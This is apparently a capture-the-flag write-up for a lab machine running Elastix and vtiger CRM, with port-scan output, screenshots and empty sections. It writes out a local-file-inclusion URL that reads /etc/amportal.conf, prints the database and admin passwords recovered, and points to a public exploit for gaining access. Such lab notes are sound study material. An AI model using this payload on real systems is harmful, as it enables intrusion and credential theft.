# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/gKl3FBX.png)
![](https://i.imgur.com/Prr7rKw.png)
```shell
PORT      STATE    SERVICE      REASON      VERSION
22/tcp    open     ssh          syn-ack     OpenSSH 4.3 (protocol 2.0)
25/tcp    open     smtp?        syn-ack
80/tcp    open     http         syn-ack     Apache httpd 2.2.3
110/tcp   open     pop3?        syn-ack
111/tcp   open     rpcbind      syn-ack     2 (RPC #100000)
143/tcp   open     imap?        syn-ack
443/tcp   open     ssl/http     syn-ack     Apache httpd 2.2.3 ((CentOS))
993/tcp   open     imaps?       syn-ack
995/tcp   open     pop3s?       syn-ack
3306/tcp  open     mysql?       syn-ack
4445/tcp  open     upnotifyp?   syn-ack
4848/tcp  filtered appserv-http no-response
5911/tcp  filtered cpdlc        no-response
10000/tcp open     http         syn-ack     MiniServ 1.570 (Webmin httpd)
```
- It was Kinda pain in ass to enumerate the web, bc it was using old ssl and it can be opened on chrome, so i downloaded an old brower called flank... 
	- ![](https://i.imgur.com/7EofGfR.png)
![](https://i.imgur.com/iWDqHgx.png)
Used the LFI payload
	![](https://i.imgur.com/cdgpqnH.png)
- ![](https://i.imgur.com/b8Df1du.png)
### Gaining Access
![](https://i.imgur.com/fNYD4le.png)
`https://10.129.206.237/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
```shell
~things we got
AMPDBPASS=amp109 AMPDBPASS=jEhdIekWmdjE AMPENGINE=asterisk AMPMGRUSER=admin 
#FOPPASSWORD=passw0rd FOPPASSWORD=jEhdIekWmdjE 

ARI_ADMIN_USERNAME=admin 
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```
![](https://i.imgur.com/1vHiByA.png)

 i put the password on the elastix and it worked
	![](https://i.imgur.com/aJSlolv.png)
![](https://i.imgur.com/Oy5YtU6.png)
`https://10.129.206.237/admin/config.php`
![](https://i.imgur.com/daSI1sF.png)
![](https://i.imgur.com/PotgqHK.png)
![](https://i.imgur.com/fsmtsJZ.png)
` fanis : fji#REH9i##nrII `
https://www.exploit-db.com/exploits/18650
	- I just changed the Extension to 233
![](https://i.imgur.com/80zAlYj.png)
## Internal
### Enumeration


### Gaining Access


### Maintaining Access
![](https://i.imgur.com/Rjy3lY9.png)
![](https://i.imgur.com/TvEkEet.png)


# Random Notes